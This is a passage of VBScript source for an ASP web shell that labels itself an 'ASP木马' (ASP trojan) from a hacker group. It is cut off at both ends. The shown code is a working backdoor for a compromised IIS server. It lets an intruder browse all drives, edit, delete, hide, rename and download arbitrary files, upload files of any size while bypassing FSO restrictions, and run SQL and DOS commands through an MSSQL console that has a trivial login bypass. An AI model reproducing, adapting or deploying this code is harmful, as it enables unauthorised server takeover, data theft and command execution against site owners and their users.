	response.redirect self&"?fp1="&fp1&"\"
end if
if fdo="newfile" then
	fp1=pn(fp1):if not fs.fileExists(fp1) then fs.createtextfile(fp1)
	response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="sedit" then
        fs.getfile(fp1).attributes=32
	fs.CreateTextFile(fp1).Write Request("fp2")
	close
end if
if fdo="gedit" then
	att=fs.getfile(fp1).attributes
	echo "<form METHOD=POST action="""&self&"""><input type=text name=fp1 size=50 value="""&fp1&"""><br>"
	echo "<input name=fdo value=sedit type=hidden><_textarea cols=90 rows=20 name=fp2>"
	wj=fs.OpenTextFile(fp1,1,0,0).read(5000000)
	echo replace(replace(wj,"</text"&"area>","</_text"&"area>"),"</TEXT"&"AREA>","</_te"&"xtarea>")
	echo "</_textarea><center><input type=submit value=-------保存-------> <a onclick=opener=null;self.close();>放弃</a></form>"
	response.write "<script>"
response.write "function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi<100000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}"
response.write "function ccc()"
response.write "{"
response.write "var tx;"
response.write "tx=document.all.fp2.value;"
response.write "tx=replace(tx,""_tex"+"tarea"",""_textarea"");"
response.write "document.all.fp2.value=tx;"
response.write "};"
response.write "ccc()"
response.write "</script>"
	response.end
end if
if fdo="ren" then
	if fs.fileExists(fp1) then fs.movefile fp1,fp2
	if fs.folderExists(fp1) then fp1=pn(fp1):fs.movefolder fp1,pn(fp2):fp1=fp2
	response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="del" then
	if fs.fileExists(fp1) then fs.DeleteFile fp1,True
	if fs.folderExists(fp1) then fp1=pn(fp1):fs.Deletefolder fp1,True
	fp1=parentdir(fp1&"\")
	response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="copy" then
	if fs.fileExists(fp1) then fs.CopyFile fp1,fp2
	if fs.folderExists(fp1) then fs.Copyfolder pn(fp1),pn(fp2)
	close
end if
if fdo="sattr" then
	if fs.fileExists(fp1) then fs.getfile(fp1).attributes=fp2 or 32
	if fs.folderExists(fp1) then fs.getfolder(fp1).attributes=fp2 or 32
	close
end if
if fdo="gattr" then
	if fs.fileExists(fp1) then att=fs.getfile(fp1).attributes
	if fs.folderExists(fp1) then att=fs.getfolder(fp1).attributes
    	Set f = fs.GetFile(fp1)
	echo "文件路径:"&fp1&"<br>"
	echo "创建时间:"&f.DateCreated&"<br>"
	echo "修改时间:"&f.DateLastModified&"<br>"
	echo "访问时间:"&f.DateLastAccessed&"<br>"
	echo "文件类型:"&f.type&"<br>"
	echo "文件大小:"&f.size&"字节"
	echo "<form name=fgs METHOD=POST action="""&self&"""><input type=hidden name=fp1 value="""&fp1&""">"
	echo "只读<input type=checkbox name=c1 ":if att and 1 then echo "checked"
	echo ">　隐藏<input type=checkbox name=c2 ":if att and 2 then echo "checked"
	echo ">　系统<input type=checkbox name=c3 ":if att and 4 then echo "checked"
	echo "><input name=fdo value=sattr type=hidden><input name=fp2 value="&att&" type=hidden><br><br>"
	echo "<a onclick='var s=0;if(c1.checked)s+=1;if(c2.checked)s+=2;;if(c3.checked)s+=4;fp2.value=s;fgs.submit();'><center>修改</center></a>"
	echo "</form>"
	response.end
end if
'开始
echo "<table border=0 cellspacing=0 cellpadding=0><tr><td>"
for each d in fs.drives '盘符
	drv=d.DriveLetter
	echo "<a href="""&self&"?fp1="&drv&":\"" class=pczzbot>"&drv&Tran(d.DriveType)&"</a> "
next
'if fp1="" then response.end
n=parentdir(fp1)
echo "<a href="&Request.ServerVariables("URL")&"?gl=pz target='_self' class=pczzbot>返回</a><form name=form1 method=post action="""&self&"?fdo=up"" enctype=multipart/form-data>绝对路径:<input name=filepath type=text value="""&fp1&""" size=15> "
echo "<input type=file name=file1 value= size=1> <input type=submit name=Submit value=上传></td></form></tr>"
echo "<tr><td><form name=f><input size=30 name=fp1 value="""&fp1&"""> <input type=submit value=转到> "
if n<>"" then
	echo "<a href=# onclick=""sattw('"&replace(fp1,"\","/")&"')"">属性</a> "
	echo "<a href=# onclick=""cpy('"&replace(fp1,"\","/")&"')"">复制</a> "
	echo "<a href='"&self&"?fdo=del&fp1="&fp1&"'>删除</a> "
	echo "<a href='"&self&"?fdo=hide&fp1="&fp1&"'>隐藏</a> "
	echo "<a href=""javascript:location='"&self&"?fdo=ren&fp1="&replace(fp1,"\","/")&"&fp2='+document.all.f.fp1.value;"">改名</a> "
end if
if fp1<>"" then
echo "<a href=""javascript:location='"&self&"?fdo=adddir&fp1="&replace(fp1,"\","/")&"'+document.all.fu.file1.value;"">新文件夹</a> "
echo "<a href=""javascript:location='"&self&"?fdo=newfile&fp1="&replace(fp1,"\","/")&"'+document.all.fu.file1.value;"">新文件</a> "
echo " <a href=# onclick=downall();>下载</a>　　"
end if
echo "本文件：[<a href="""&self&"?fp1="&server.mappath(".")&"\"">目</a>]"
sef=replace(request("PATH_TRANSLATED"),"\","/")
echo "[<a target=_BLANK href='"&self&"?fdo=gedit&fp1="&sef&"'>编</a>]"
echo "[<a href='"&self&"?fdo=del&fp1="&sef&"'>删</a>]"
echo "[<a href=javascript:sattw("""&sef&""")>属</a>]"
echo "[<a href=javascript:cpy("""&sef&""")>复</a>]"
echo "</td></tr></form></table>"
if n<>"" then echo "[<a href="""&self&"?fp1="&n&"""><font color=#FF0000>上级目录..</font></a>]"
if fp1="" then response.end
Set fdir=fs.GetFolder(fp1) '目录
c=0:For each n in fdir.SubFolders
	c=c+1:echo "[<a href="""&self&"?fp1="&fp1&n.name&"\"">"&n.name&"</a>]"
Next::response.write "总共个<font color=red>"::response.write c::response.write "</font>子目录<hr>"&bbf&"<table width=760 border=0 cellspacing=1 cellpadding=0><script>"&bbf&"":
echo "var fp1="""&replace(fp1,"\","\\")&""";"
echo "var url="""&replace(self,"\","\\")&""";"
::response.write "var c="""",itm=0,down="""";"&bbf&"function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi<1000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}"&bbf&"function ow(w){return window.open("""","""",""scrollbars=no,toolbar=no,location=no,directories=no,status=no,menubar=no,resizable=no,height=300,width=""+w);}"&bbf&"function cpy(srcf)"&bbf&"{w=ow(400);w.moveTo(100,200);"&bbf&"z=""<style>body{COLOR:#ffffff;TEXT-DECORATION:none;FONT-SIZE:9pt;SCROLLBAR-FACE-COLOR:#000000;SCROLLBAR-HIGHLIGHT-COLOR:#000000;SCROLLBAR-SHADOW-COLOR:#ffffff;SCROLLBAR-3DLIGHT-COLOR:#ffffff;SCROLLBAR-ARROW-COLOR:#ffffff;SCROLLBAR-TRACK-COLOR:#ffffff;SCROLLBAR-DARKSHADOW-COLOR:#000000;FONT-FAMILY:宋体;}input{font-size:9pt;border:1px solid;#006699;color:ffffff;background-color:black;vertical-align:middle;margin-bottom:1px;padding: 0.1em;}</style><body bgcolor=000000><form method=post action=\""""+url+""?fdo=copy\"">"";"&bbf&"z+=""从<input size=53 name=fp1 value=\""""+srcf+""\""><br>到<input size=53 name=fp2 value=\""""+srcf+""\"">"";"&bbf&"z+=""<center><input type=submit value=--复制--></form></body>"""&bbf&"w.document.write(z);}"&bbf&"function sattw(srcf){w=ow(350);w.location=url+""?fdo=gattr&fp1=""+srcf;}"&bbf&"function ren(f1,f2){location=url+""?fdo=ren&fp1=""+fp1+f1+""&fp2=""+fp1+document.all[f2].value;}"&bbf&"function downall(){ow(600).document.write(down);}"&bbf&"function sf(lpstr,lpsize)"&bbf&"{"&bbf&"var p1,p2,z;"&bbf&"if(!(parseInt((itm)/2)%2))c=""#3A3A3F"";else c=""#414141"";"&bbf&"itm++;"&bbf&"p1=""<td><a href=\""""+url+""?fdo="";"&bbf&"p2=""&fp1=""+fp1+lpstr+""\"">"";"&bbf&"z="""";if(itm%2)z=""<tr bgcolor=""+c+"">"";"&bbf&"z+=""<td><a href='javascript:sattw(\""""+replace(fp1,""\\"",""/"")+lpstr+""\"")'>属性</a></td>"";"&bbf&"z+=""<td><a target=_BLANK href=\""""+url+""?fdo=gedit&fp1=""+fp1+lpstr+""\"">编辑</a></td>"";"&bbf&"z+=""<td><a href='javascript:cpy(\""""+replace(fp1,""\\"",""/"")+lpstr+""\"")'>复制</a></td>"";"&bbf&"z+=""<td width=178><input size=20 name=o""+itm+"" value=\""""+lpstr+""\"" style=background-color:""+c+"";> <a onclick=ren(\""""+lpstr+""\"",\""o""+itm+""\"");>改名</a></td>"";"&bbf&"if(lpsize>0){z+=p1+""down""+p2+""下载</a></td>"";down+=""[<a href=\""""+url+""?fdo=down""+p2+lpstr+""</a>]"";}else z+=""<td></td>"""&bbf&"z+=p1+""del""+p2+""删除</a></td>"";"&bbf&"z+=""<td title='""+lpsize/1000000+""M""+""' ondblclick=location='""+url+""?gl=sql&sahost=""+replace(fp1,""\\"",""/"")+lpstr+""';>""+lpsize+""</td>"";"&bbf&"if(!(itm%2))z+=""</tr>"";else z+=""<td bgcolor=#000000 width=30> </td>"""&bbf&"document.write(z);"&bbf&"}"&bbf&"":c=0:For each n in fdir.Files '文件
	c=c+1:echo "sf('"&n.name&"','"&n.size&"');"
next
echo "</script></table>以上总共<font color=red>"&c&"</font>个文件<hr>"

function getvalue(lpitem)
	pstr="name="&chr(34)&lpitem&chr(34)
	startpos=instrb(1,lnBytes,CstrB(pstr))
	if startpos<2 then getvalue="":exit function
	startpos=instrb(startpos,lnBytes,CstrB(bbf&bbf))+4
	EndPos=instrb(startpos,lnBytes,Sign)-2
	getvalue=BtoS(midb(lnBytes,startpos,EndPos-startpos))
end function
function getfdata()
	dim lpdata(1)
	startpos=instrb(1,lnBytes,CstrB("filename="""))
	if startpos<2 then getfdata="":exit function
	startpos=instrb(startpos,lnBytes,CStrB(bbf&bbf))+4
	EndPos=instrb(startpos,lnBytes,Sign)-2
	getfdata=(startpos-1)&","&(EndPos-startpos)
end function
function savefile(lpFileName)
	fdata=getfdata()
	fdata=split(fdata,",")
	if fdata(0)<1 or fdata(1)<1 then savefile=-1:exit function
	dr1.write lnBytes
	dr1.position=fdata(0)
	dr1.copyto dr2,fdata(1)
	dr2.SaveToFile lpFileName,2
end function
function getfilename()
	startpos=instrb(1,lnBytes,CstrB("filename="&chr(34)))+10
	if startpos<2 then getfilename="":exit function
	EndPos=instrb(startpos,lnBytes,CstrB(""""))
	getfilename=BtoS(midb(lnBytes,startpos,EndPos-startpos))
end function

Function tractName(lpfilename)
	nlen=len(lpfilename)
	For lpx = nlen To 1 step -1
		if mid(lpfilename,lpx,1)="\" then
			tractName=mid(lpfilename,lpx+1,100)
			exit Function
		end if
	Next
	tractName=""
End Function
function parentdir(t)
	ls=split(t,"\")
	for x=0 to ubound(ls)-2
	parentdir=parentdir+ls(x)&"\"
	next
End function
function pn(t)
	pn=replace(t,"/","\")
	if right(pn,1)="\" then pn=left(pn,len(pn)-1)
	if right(pn,1)="\" then pn=left(pn,len(pn)-1)
End function
function downFile(strFile)
	Response.Buffer = True
	Response.Clear
	Set s=Server.CreateObject(AdodbS)
	s.Open
	s.Type=1
	if not fs.FileExists(strFile) then Response.Write(strFile&"文件不存在！"):Response.End
	Set f=fs.GetFile(strFile)
	intFilelength=f.size
	s.LoadFromFile(strFile)
	if err then Response.Write("读文件出错:"&err.Description):Response.End
	Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
	Response.AddHeader "Content-Length", intFilelength
	Response.CharSet = "UTF-8"
	Response.ContentType = "application/octet-stream"
	Response.BinaryWrite s.Read
	response.flush
	response.clear
	s.Close
	Set s = Nothing
End Function 
function Tran(drv)
select case drv:case 0:Tran="怪盘":case 1:Tran="软盘":case 2:Tran="硬盘"
case 3:Tran="网络":case 4:Tran="光盘":case 5:Tran="RAM":end select:end function
response.end
end if
'免FSO上传开始
Dim oUpFileStream 
Class UpFile_Class 
Dim Form,File,Version,Err 
Private Sub Class_Initialize 
Version = "Version V1.0" 
Err = -1 
End Sub 

Private Sub Class_Terminate 
'清除变量及对像 
If Err < 0 Then 
Form.RemoveAll 
Set Form = Nothing 
File.RemoveAll 
Set File = Nothing 
oUpFileStream.Close 
Set oUpFileStream = Nothing 
End If 
End Sub 

Public Sub GetDate (RetSize) 
'定义变量 
Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo 
Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName 
Dim iFindStart,iFindEnd 
Dim iFormStart,iFormEnd,sFormName 
'代码开始 
If Request.TotalBytes < 1 Then 
Err = 1 
Exit Sub 
End If 
If RetSize > 0 Then 
If Request.TotalBytes > RetSize Then 
Err = 2 
Exit Sub 
End If 
End If 
Set Form = Server.CreateObject ("Scripting.Dictionary") 
Form.CompareMode = 1 
Set File = Server.CreateObject ("Scripting.Dictionary") 
File.CompareMode = 1 
Set tStream = Server.CreateObject ("ADODB.Stream") 
Set oUpFileStream = Server.CreateObject ("ADODB.Stream") 
oUpFileStream.Type = 1 
oUpFileStream.Mode = 3 
oUpFileStream.Open 
oUpFileStream.Write Request.BinaryRead (Request.TotalBytes) 
oUpFileStream.Position = 0 
RequestBinDate = oUpFileStream.Read 
iFormEnd = oUpFileStream.Size 
bCrLf = ChrB (13) & ChrB (10) 
'取得每个项目之间的分隔符 
sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1) 
iStart = LenB (sSpace) 
iFormStart = iStart+2 
'分解项目 
Do 
iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3 
tStream.Type = 1 
tStream.Mode = 3 
tStream.Open 
oUpFileStream.Position = iFormStart 
oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart 
tStream.Position = 0 
tStream.Type = 2 
tStream.CharSet = "gb2312" 
sInfo = tStream.ReadText 
'取得表单项目名称 
iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1 
iFindStart = InStr (22,sInfo,"name=""",1)+6 
iFindEnd = InStr (iFindStart,sInfo,"""",1) 
sFormName = Mid (sinfo,iFindStart,iFindEnd-iFindStart) 
'如果是文件 
If InStr (45,sInfo,"filename=""",1) > 0 Then 
Set oFileInfo = new FileInfo_Class 
'取得文件属性 
iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10 
iFindEnd = InStr (iFindStart,sInfo,"""",1) 
sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart) 
oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1) 
oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\")+1) 
oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1) 
iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14 
iFindEnd = InStr (iFindStart,sInfo,vbCr) 
oFileInfo.FileType = Mid (sinfo,iFindStart,iFindEnd-iFindStart) 
oFileInfo.FileStart = iInfoEnd 
oFileInfo.FileSize = iFormStart -iInfoEnd -2 
oFileInfo.FormName = sFormName 
file.add sFormName,oFileInfo 
else 
'如果是表单项目 
tStream.Close 
tStream.Type = 1 
tStream.Mode = 3 
tStream.Open 
oUpFileStream.Position = iInfoEnd 
oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2 
tStream.Position = 0 
tStream.Type = 2 
tStream.CharSet = "gb2312" 
sFormValue = tStream.ReadText 
If Form.Exists (sFormName) Then 
Form (sFormName) = Form (sFormName) & ", " & sFormValue 
else 
form.Add sFormName,sFormValue 
End If 
End If 
tStream.Close 
iFormStart = iFormStart+iStart+2 
'如果到文件尾了就退出 
Loop Until (iFormStart+2) = iFormEnd 
RequestBinDate = "" 
Set tStream = Nothing 
End Sub 
End Class 

'文件属性类 
Class FileInfo_Class 
Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt 
'保存文件方法 
Public Function SaveToFile (Path) 
On Error Resume Next 
Dim oFileStream 
Set oFileStream = CreateObject ("ADODB.Stream") 
oFileStream.Type = 1 
oFileStream.Mode = 3 
oFileStream.Open 
oUpFileStream.Position = FileStart 
oUpFileStream.CopyTo oFileStream,FileSize 
oFileStream.SaveToFile Path,2 
oFileStream.Close 
Set oFileStream = Nothing 
End Function 

'取得文件数据 
Public Function FileDate 
oUpFileStream.Position = FileStart 
FileDate = oUpFileStream.Read (FileSize) 
End Function 
End Class 
'免FSO上传结束
'上传
dim Data_pczz
Class upload_pczz
dim objForm,objFile,Version
Public function Form(strForm)
strForm=lcase(strForm)
if not objForm.exists(strForm) then
Form=""
else
Form=objForm(strForm)
end if
end function
Public function File(strFile)
strFile=lcase(strFile)
if not objFile.exists(strFile) then
set File=new FileInfo
else
set File=objFile(strFile)
end if
end function
Private Sub Class_Initialize
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd
dim iFormStart,iFormEnd,sFormName
set objForm=Server.CreateObject("Scripting.Dictionary")
set objFile=Server.CreateObject("Scripting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream = Server.CreateObject("adodb.stream")
set Data_pczz = Server.CreateObject("adodb.stream")
Data_pczz.Type = 1
Data_pczz.Mode =3
Data_pczz.Open
Data_pczz.Write  Request.BinaryRead(Request.TotalBytes)
Data_pczz.Position=0
RequestData =Data_pczz.Read
iFormStart = 1
iFormEnd = LenB(RequestData)
vbCrlf = chrB(13) & chrB(10)
sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart = LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart + 10) < iFormEnd
iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type = 1
tStream.Mode =3
tStream.Open
Data_pczz.Position = iFormStart
Data_pczz.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sInfo = tStream.ReadText
tStream.Close
iFormStart = InStrB(iInfoEnd,RequestData,sStart)
iFindStart = InStr(22,sInfo,"name=""",1)+6
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
if InStr (45,sInfo,"filename=""",1) > 0 then
set theFile=new FileInfo
iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)
iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd = InStr(iFindStart,sInfo,vbCr)
theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart =iInfoEnd
theFile.FileSize = iFormStart -iInfoEnd -3
theFile.FormName=sFormName
if not objFile.Exists(sFormName) then
objFile.add sFormName,theFile
end if
else
tStream.Type =1
tStream.Mode =3
tStream.Open
Data_pczz.Position = iInfoEnd
Data_pczz.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sFormValue = tStream.ReadText
tStream.Close
if objForm.Exists(sFormName) then
objForm(sFormName)=objForm(sFormName)&", "&sFormValue
else
objForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
objForm.RemoveAll
objFile.RemoveAll
set objForm=nothing
set objFile=nothing
Data_pczz.Close
set Data_pczz =nothing
end if
End Sub
Private function GetFilePath(FullPath)
If FullPath <> "" Then
GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
Else
GetFilePath = ""
End If
End  function
Private function GetFileName(FullPath)
If FullPath <> "" Then
GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
Else
GetFileName = ""
End If
End  function
End Class
Class FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub Class_Initialize
FileName = ""
FilePath = ""
FileSize = 0
FileStart= 0
FormName = ""
FileType = ""
End Sub
Public function SaveAs(FullPath)
dim dr,ErrorChar,i
SaveAs=true
if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
Data_pczz.position=FileStart
Data_pczz.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing
SaveAs=false
end function
End Class
'上传结束
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''免FSO

if Session("gl")="nofso" then
response.clear
echo"<HTML><HEAD><title>中国砍客联盟荣誉出品(Http://Www.Kker.Cn)--->砍客ASP木马Ver1.2 服务器时间："&now()&" </title>"
echo"<META http-equiv=Content-Type content=text/html; charset=gb2312>"
echo"<STYLE type=text/css>TD {"
echo" FONT-SIZE: 9pt}"
echo"TEXTAREA { FONT-SIZE: 9pt}"
echo"input{font-size:9pt;border:1px solid #006699;color: ffffff;background-color:black;vertical-align:middle;margin-bottom:1px;padding: 0.1em;}"
echo"BODY { COLOR:#ffffff;TEXT-DECORATION:none;FONT-SIZE:9pt;SCROLLBAR-FACE-COLOR:#000000;SCROLLBAR-HIGHLIGHT-COLOR:#000000;SCROLLBAR-SHADOW-COLOR:#ffffff;SCROLLBAR-3DLIGHT-COLOR:#ffffff;SCROLLBAR-ARROW-COLOR:#ffffff;SCROLLBAR-TRACK-COLOR:#ffffff;SCROLLBAR-DARKSHADOW-COLOR:#000000;BACKGROUND-COLOR: #000000}"
echo".small { FONT-SIZE: 8pt}</STYLE>"

'Server.ScriptTimeOut=999999 '要是你的上传的文件比较大，就必须设置。 
'定义变量 
dim Forumupload,ranNum 
dim formName,formPath,filename,file_name,fileExt,Filesize,F_Type 
dim dateupnum 
dim rename 
dim previewpath,F_Viewname 
F_Viewname="" 
previewpath="PreviewImage/" 
'===========================免FSO上传============================ 
if request("up")="yes" then
Server.ScriptTimeOut=999999 

dim upload,file 
set upload=new UpFile_Class ''建立上传对象 
upload.GetDate (10000000*1024) '取得上传数据,不限大小 
formPath=upload.form("filepath") 
'在目录后加(/) 
if right(formPath,1)<>"/" then formPath=formPath&"/" 

for each formName in upload.file ''列出所有上传了的文件 
set file=upload.file(formName) ''生成一个文件对象 
fileExt=lcase(file.FileExt) ''文件类型 
'付值变量 
randomize 
ranNum=int(90000*rnd)+10000 

'file_name=lcase(file.filename) 
'filename=file_name&"."&fileExt 
filename=lcase(file.filename) 
rename=filename&"│" 
filename=formPath&filename 
Filesize=file.FileSize 

'记录文件 
if Filesize>0 then '如果 FileSize > 0 说明有文件数据 
file.SaveToFile Server.mappath(FileName) ''执行上传文件 

response.write "<center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" 上传成功!<br><a href='"&filename&"' target=_blank><font color=006699>查看</font></a><br><a href='?upfile=yes'><font color=006699>继续上传</font></a><br><a href="&Request.ServerVariables("URL")&"?gl=pz target='_self'><font color=006699>返回</font></a></center>"
response.end
end if 
set file=nothing 
next 
'===========================免FSO上传完成============================ 
end if 

response.Write "</head><body>"
response.Write "<div align='center'><p><font color='#FF0000' size=2><b>免FSO上传</b></font></p>"
response.Write "<TABLE height=58 cellSpacing=0 cellPadding=0 width=347 border=0>"
response.Write "<form name=form method=post action=?up=yes enctype=multipart/form-data>"
response.Write "<TBODY>"
response.Write "<TR vAlign=center align=middle>"
response.Write "<TD height=30>上传路径(<font color=006699>虚拟路径</font>):<FONT color=#ffffff> <input type=text name=filepath value=/ size=15> </FONT></TD></TR>"
response.Write " <TR vAlign=center align=middle>"
response.Write "<TD height=28><input type=hidden name=act value=upload><input type=hidden name=fname><input type=file name=file1> <input type=submit name=Submit value=上传 onclick=""fname.value=file1.value""></TD></TR></FORM></TBODY></TABLE>"
response.Write "<br><a href="&Request.ServerVariables("URL")&"?gl=pz target='_self'><font color=006699>返回</font></a>"
response.Write "</div>"
response.Write "</body></html>"
response.end
end if


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''数据库
if Session("gl")="sql"   then
response.clear
if request("sahost")<>"" then sqlhostz=request("sahost")
if Session("sqlts")="" then Session("sqlts")=20
if request("sqlts")<>"" then Session("sqlts")=request("sqlts")
sqlss="top "&Session("sqlts")
if Session("sqlts")="0" then sqlss=" "
echo "<title>机器名："&oScriptNet.ComputerName&";帐号："&oScriptNet.UserName&";WEB路径："&request.servervariables("APPL_PHYSICAL_PATH")&";ADSIPath："&request.servervariables("APPL_MD_PATH")&";服务器时间："&now()&"	</title>"
echo"<META http-equiv=Content-Type content=text/html; charset=gb2312>"
echo"<STYLE type=text/css>TD {"
echo" FONT-SIZE: 9pt}"
echo"TEXTAREA { FONT-SIZE: 9pt}"
echo"input{font-size:9pt;border:1px solid #006699;color: ffffff;background-color:black;vertical-align:middle;margin-bottom:1px;padding: 0.1em;}"
echo"BODY { COLOR:#ffffff;TEXT-DECORATION:none;FONT-SIZE:9pt;SCROLLBAR-FACE-COLOR:#000000;SCROLLBAR-HIGHLIGHT-COLOR:#000000;SCROLLBAR-SHADOW-COLOR:#ffffff;SCROLLBAR-3DLIGHT-COLOR:#ffffff;SCROLLBAR-ARROW-COLOR:#ffffff;SCROLLBAR-TRACK-COLOR:#ffffff;SCROLLBAR-DARKSHADOW-COLOR:#000000;FONT-FAMILY:宋体;BACKGROUND-COLOR: #000000}"
echo".small { FONT-SIZE: 8pt}</STYLE>"
echo "<script>function copys(s){"
echo "document.all.sqlstr.value=s;"
echo "}</script>"
echo "<script>"
echo "function nom(){event.cancelBubble = true;event.returnValue = false;return false;}"
echo "function click() {if (event.button==2) {movable=(!movable);}nom();}"
echo "document.oncontextmenu=click;"
echo "document.onmousedown=click;"
echo "</script>"
echo "<body Leftmargin=""6"" Topmargin=""140"" onload=movediv()>"
echo "<script>"
echo "var movable=0;"
echo "function movediv(){"
echo "if(movable==1){"
echo "toolb.style.pixelTop= document.body.scrollTop;"
echo "toolb.style.pixelLeft= document.body.scrollLeft;"
echo "movs.innerHTML=""不浮动"";}"
echo "else{toolb.style.pixelTop= 0;toolb.style.pixelLeft= 0;"
echo "movs.innerHTML=""浮动"";}"
echo "setTimeout('movediv()',200);"
echo "}"
echo "</script>"
echo "<div id=toolb style=""position:absolute;Left:10px;Top:0px;width:100%""> "
echo "<table cellspacing=0 cellpadding=0 width=100% border=1><tr><td>"
echo "<form action='"&request("script_name")&"?table="&request("table")&"' method=post>"
echo "<span onclick=document.location='"&request("script_name")&"?c=3'>[显示库列表]</span> --"
echo "<span onclick=document.location='"&request("script_name")&"?c=1'>[显示所有表]</span> --"
echo "<span onclick=sel();>[显示当前表]</span> --"
echo "<span onclick=ins();>[insert]</span> --"
echo "<span onclick=del();>[delete]</span> --"
echo "<span onclick=drop();>[drop]</span> --"
echo "<span onclick=createt();>[create]</span> --"
echo "<span onclick=document.location='"&request("script_name")&"?c=100'>[(只显示用户表)]</span> --&nbsp;"
echo "<span onclick=document.location='"&request("script_name")&"?c=101'>[(显示所有表)]</span>"
echo "<span onclick=document.location='"&request("script_name")&"?c=886'>&nbsp;((退出MSSQL管理))</span>--"
echo "<span onclick=document.location='"&Request("URL")&"?gl=pz'>((返回))</span> "
echo "<input size=3 name=sqlts value="&session("sqlts")&" >"
echo "<script>function createt(){document.all.sqlstr.value='create table "&session("dbo")&"[] ([id] int identity(1,1)/*mdb=autoincrement*/)';}</script>"
echo "<_textarea name=sqlstr cols=106 rows=5> "&request("sqlstr")&"</_textarea><br>"
echo "<input type=submit name=ppp value=runsql>"
echo "<input type=submit name=ppp value=rundos>"
echo "<input type=""checkbox"" value=""n"" name=""sc"">不显示结果"
echo "<span id=movs onclick=""javascript:movable=(!movable)"">浮动</span>"
echo "</td></tr></form></table></div>"
server.scriptTimeout=100000
bbf=chr(13)&chr(10)

if request("c")=886 then
	session("islogin")=""
	response.write "<script>location='"&request("script_name")&"';</script>"
	response.end
end if
if session("islogin")<>"ok" then
	pass=request.form("pass")
	if pass="islogin" then
		session("islogin")="ok"
	else
		echo "<div style=position:absolute;width:100%;Left:10px;Top:150px;><form method=post>"
		echo "<input type=hidden name=pass value=islogin><br>"
		echo "host:<input type=text name=host value="&sqlhostz&"><br>"
		echo "user:<input type=text name=user value="&sqluserz&"><br>"
		echo "pass:<input type=text name=upass value="&sqlpassz&"><br>"
		echo "dbase<input type=text name=database value=><br>"
		echo "<input type=submit></form></div>"
		response.end
	end if
end if

function echo(lpstr):response.write lpstr:end function
Function GetTableFromSQL(Byval SQL)
	Dim charPos, charLen, wordlist
	SQL = LCase(SQL)
	charPo1 = InStr(1, SQL, " from ")
	if charPo1<1 then charPo1 = InStr(1, SQL, " into ")
	if charPo1<1 then charPo1 = InStr(1, SQL, "update")
	if charPo1>0 then
		charPo2 = InStr(charPo1+7, SQL, " ")
		If charPo2 > 0 Then
			SQL = Mid(SQL, charPo1+6, charPo2)
		Else
			SQL = Mid(SQL, charPo1+6)
		End If
		If Left(SQL, 1) = "[" Then SQL = Mid(SQL, 2)
		If Right(SQL, 1) = "]" Then SQL = Left(SQL, Len(SQL) - 1)
		GetTableFromSQL = SQL
	end if
End Function
function delhtml(str):delhtml=server.htmlencode(ltrim(str)):end function
bbf=chr(13)&chr(10)
dsnname     =  "data source="&request("host")&";"
dsnusername =  "user id="&request("user")&";"
if request("upass")<>"" then dsnpassword = "password="&request("upass")&";"
if request("database")<>"" then 
session("schoolname")=request("database")
response.redirect request("url")&"?c=1"
end if
if session("schoolname")="" then session("schoolname")= "master"


set adoconn = server.createobject("adodb.connection")
if request("host")<>"" then
